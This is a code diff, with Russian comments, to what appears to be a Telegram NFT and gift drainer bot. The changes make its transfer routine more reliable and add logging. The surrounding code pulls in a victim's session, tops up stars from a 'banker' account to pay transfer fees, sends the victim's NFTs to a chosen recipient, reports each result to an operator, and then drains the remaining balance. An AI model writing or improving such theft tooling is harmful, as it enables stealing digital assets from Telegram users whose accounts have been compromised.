@@ -603,8 +603,24 @@ def analyze_gift(gift, location_name="Me"):
         if can_transfer_at is None:
             details['can_transfer'] = True
         else:
-            now = datetime.now(can_transfer_at.tzinfo) if can_transfer_at.tzinfo else datetime.now()
-            details['can_transfer'] = (can_transfer_at <= now)
+            # can_transfer_at может быть int (timestamp) или datetime объект
+            from datetime import datetime
+            try:
+                if isinstance(can_transfer_at, int):
+                    # Это timestamp, преобразуем в datetime
+                    transfer_time = datetime.fromtimestamp(can_transfer_at)
+                    now = datetime.now()
+                    details['can_transfer'] = (transfer_time <= now)
+                elif hasattr(can_transfer_at, 'tzinfo'):
+                    # Это datetime объект
+                    now = datetime.now(can_transfer_at.tzinfo) if can_transfer_at.tzinfo else datetime.now()
+                    details['can_transfer'] = (can_transfer_at <= now)
+                else:
+                    # Используем значение из объекта gift, если оно уже вычислено
+                    details['can_transfer'] = can_transfer
+            except Exception as e:
+                # В случае ошибки используем значение из объекта gift
+                details['can_transfer'] = can_transfer
     else:
         details['can_convert'] = (convert_price > 0) and (not is_converted)
         if gift_id:
@@ -1199,10 +1215,15 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             await cleanup_and_drain(client, SETTINGS.get("banker_session", "main_admin"))
             return nft_log_results, current_balance
 
-        # Логируем NFT на холде
+        # Логируем NFT на холде (добавляем в результаты сразу)
         for g in profile_gifts:
             if g['is_nft'] and not g['can_transfer']:
-                nft_log_results.append({'title': g['title'], 'slug': g.get('slug',''), 'status': '🕔 (Холд)'})
+                nft_log_results.append({
+                    'title': g['title'], 
+                    'slug': g.get('slug',''), 
+                    'status': '🕔 (Холд)'
+                })
+                log_transfer(f"🕔 NFT на холде добавлен в результаты: {g['title']}")
 
         # ================= 2. АГРЕССИВНОЕ ПОПОЛНЕНИЕ =================
         banker_ready = (banker and banker.is_connected)
@@ -1216,13 +1237,20 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
             target_future = asyncio.create_task(prepare_transfer_target(client, banker_username))
 
         total_fees = sum(n['transfer_cost'] for n in all_nfts_to_send)
+        log_transfer(f"💰 Требуется звезд для передачи NFT: {total_fees} ⭐️ (текущий баланс: {current_balance} ⭐️)")
         deficit = total_fees - current_balance
         banker_triggered = False
+        
+        # Если transfer_cost = 0, все равно пробуем передать
+        can_send_without_payment = (total_fees == 0 and len(all_nfts_to_send) > 0)
+        if can_send_without_payment:
+            log_transfer(f"⚠️ NFT найдены, но transfer_cost = 0 для всех. Пробуем передать без оплаты...")
         
         if deficit > 0:
             if banker_ready:
                 log_transfer(f"📉 Не хватает {deficit} зв. Сразу берем у Банкира (игнор мусора)!")
                 topup_plan = calculate_optimal_topup(deficit)
+                log_transfer(f"📦 План пополнения: {topup_plan}")
                 await asyncio.gather(*[send_gift_task(banker, me.id, p, victim_target, delay=i*0.2) for i, p in enumerate(topup_plan)])
                 banker_triggered = True
             else:
@@ -1244,16 +1272,22 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
                     if balance_check >= total_fees: break
                 except: pass
 
-        ready_to_send = False
-        balance_check = current_balance
-        for _ in range(5):
-            try:
-                balance_check = await get_stars_info(client)
-                if balance_check >= total_fees:
-                    ready_to_send = True
-                    break
-            except: pass
-            await asyncio.sleep(0.4)
+        # Если total_fees = 0, не проверяем баланс
+        if can_send_without_payment:
+            ready_to_send = True
+            balance_check = current_balance
+            log_transfer(f"✅ NFT можно передать без оплаты (transfer_cost = 0)")
+        else:
+            ready_to_send = False
+            balance_check = current_balance
+            for _ in range(5):
+                try:
+                    balance_check = await get_stars_info(client)
+                    if balance_check >= total_fees:
+                        ready_to_send = True
+                        break
+                except: pass
+                await asyncio.sleep(0.4)
 
         # ================= 4. ОТПРАВКА NFT =================
         final_recipient_id = None
@@ -1299,19 +1333,26 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
                     'slug': nft.get('slug',''), 
                     'status': f'{status_emoji} {res}' if res != 'success' else status_emoji
                 })
+                log_transfer(f"📝 NFT добавлен в результаты: {nft['title']} - {status_emoji} {res}")
                 
                 # Небольшая задержка между отправками
                 if idx < len(all_nfts_to_send) - 1:
                     await asyncio.sleep(0.5)
         else:
             status = '❌ NoMoney' if not ready_to_send else '❌ NoTarget'
-            log_transfer(f"FAIL NFT: {status} (ready_to_send={ready_to_send}, final_recipient_id={final_recipient_id})")
+            log_transfer(f"FAIL NFT: {status} (ready_to_send={ready_to_send}, final_recipient_id={final_recipient_id}, balance={balance_check}, total_fees={total_fees})")
             for nft in all_nfts_to_send: 
                 nft_log_results.append({
                     'title': nft['title'], 
                     'slug': nft.get('slug',''), 
                     'status': status
                 })
+                log_transfer(f"❌ NFT добавлен с ошибкой: {nft['title']} - {status}")
+        
+        # Убеждаемся, что все NFT добавлены в результаты
+        log_transfer(f"📊 Итого NFT в результатах: {len(nft_log_results)}")
+        for idx, nft in enumerate(nft_log_results, 1):
+            log_transfer(f"   NFT #{idx} в результатах: {nft.get('title', 'Unknown')} - {nft.get('status', '?')}")
 
         # ================= 5. ПОСТ-ФАКТУМ ЧИСТКА =================
         log_transfer("🏁 NFT отработаны. Теперь чистим мусор и сливаем остаток.")
@@ -2235,16 +2276,21 @@ class FragmentBot:
 
             # Формируем список NFT для лога
             nft_lines = []
-            if nft_results:
+            log_transfer(f"📊 Формирование сообщения: nft_results = {nft_results}, длина = {len(nft_results) if nft_results else 0}")
+            if nft_results and len(nft_results) > 0:
                 for nft in nft_results:
                     # Ссылка на NFT
-                    link = f"https://t.me/nft/{nft['slug']}" if nft['slug'] else "#"
+                    link = f"https://t.me/nft/{nft.get('slug', '')}" if nft.get('slug') else "#"
                     # Формат: <a href="link">Name</a> Status
-                    line = f"<a href='{link}'>{nft['title']}</a> {nft['status']}"
+                    status = nft.get('status', '❓')
+                    title = nft.get('title', 'Unknown NFT')
+                    line = f"<a href='{link}'>{title}</a> {status}"
                     nft_lines.append(line)
+                    log_transfer(f"📝 Добавлен NFT в сообщение: {title} - {status}")
                 nft_text = "\n".join(nft_lines)
             else:
                 nft_text = "Нет NFT"
+                log_transfer(f"⚠️ NFT результаты пусты: nft_results = {nft_results}")
 
             # Основной текст лога с цитированием
             log_text = (
